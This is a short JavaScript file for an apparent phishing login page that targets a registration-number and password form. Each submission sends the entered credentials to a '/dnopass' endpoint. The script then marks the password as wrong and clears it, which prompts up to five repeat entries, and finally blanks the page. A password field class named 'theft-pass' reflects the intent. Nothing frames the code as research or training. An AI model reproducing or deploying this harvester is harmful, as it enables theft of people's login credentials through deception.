const loginBtn = document.querySelector("button");
const dno = document.querySelector("#regnosjc");
const pass = document.querySelector(".theft-pass");
let count = 0;
loginBtn.addEventListener("click", () => {
  console.log("logged pressed");
  if (count < 5) {
    const jsonData = {
      dno: `${dno.value}`,
      pass: `${pass.value}`,
    };
    fetch("/dnopass", {
      method: "post",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify(jsonData),
    })
      .then((res) => res.json())
      .then((data) => {
        console.log(data);
        count++;
        pass.style.border = "5px solid red";
        pass.value = '';
      })
      .catch((err) => {
        console.log(err);
      });
  }
  else{
    console.log("cant store"); 
    document.body.style.display = 'none';
  }
});
